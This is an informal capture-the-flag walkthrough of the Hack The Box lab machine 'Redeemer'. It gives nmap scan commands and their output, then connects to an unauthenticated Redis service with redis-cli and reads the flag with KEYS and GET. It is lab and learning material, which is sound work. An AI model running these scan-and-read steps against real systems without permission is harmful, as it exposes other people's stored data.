📝-----------------📝
#main_info
📝-----------------📝

-Machine: Redeemer

-Link: https://app.hackthebox.com/machines/Redeemer

🪊-----------------🎸

#tool

-Nmap

-redis-cli

🌹-----------------🌹

#Proces

#get ip from HTB. Start with Nmap

```nmap -sV -Pn 10.129.212.124```

#result:

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 04:40 -1000
Nmap scan report for 10.129.212.124
Host is up (0.21s latency).
All 1000 scanned ports on 10.129.212.124 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/. Nmap done: 1 IP address (1 host up) scanned in 5.38 seconds

#'All 1000 scanned ports on 10.129.212.124 are in ignored states.'? interesting. try again 🫡👍

```nmap -Pn -sV -p- -T4 10.129.212.124```

#result:

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value              

#well, use redis cli (I googled how to do this

```redis-cli -h 10.129.212.124 -p 6379```

#result:

Could not connect to Redis at 10.129.212.124:6379: No route to host

#this is bad :( 👎. 

#'after one googled⌛'

#well. need this command

```redis-cli -h 10.129.212.124```

#yes 👍! connect👍! time find flag (i googling, how do it)

```KEYS *```

#result:

1) "temp"
2) "numb"
3) "flag"
4) "stor"

#We need "flag"

```GET flag```

#That all. Good luck and know: error -> try again -> error -> try again 
🫡

